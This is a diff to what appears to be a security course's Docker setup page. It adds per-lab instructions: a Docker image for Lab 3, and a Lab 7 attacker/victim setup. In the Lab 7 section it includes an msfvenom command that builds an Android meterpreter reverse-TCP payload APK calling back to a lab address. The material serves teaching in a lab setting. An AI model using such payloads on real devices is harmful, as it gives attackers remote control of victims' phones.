@@ -158,3 +158,24 @@ Remove all local images:
 ```
 $ docker rmi $(docker images -a -q)
 ```
+
+## For each lab
+
+### Lab 3
+
+- Dockerfile: {Download}`lab3/Dockerfile`
+- Remote: https://hub.docker.com/repository/docker/yangzhou301/lab3
+- Command:
+
+```
+$ docker run -it yangzhou301/lab3
+```
+
+### Lab 7
+
+In this lab, we need to run 2 machine (victim and attack).
+
+
+```
+$ msfvenom -p android/meterpreter/reverse_tcp LHOST=10.9.0.7 LPORT=4444 -f raw -o reverse_tcp.apk
+```
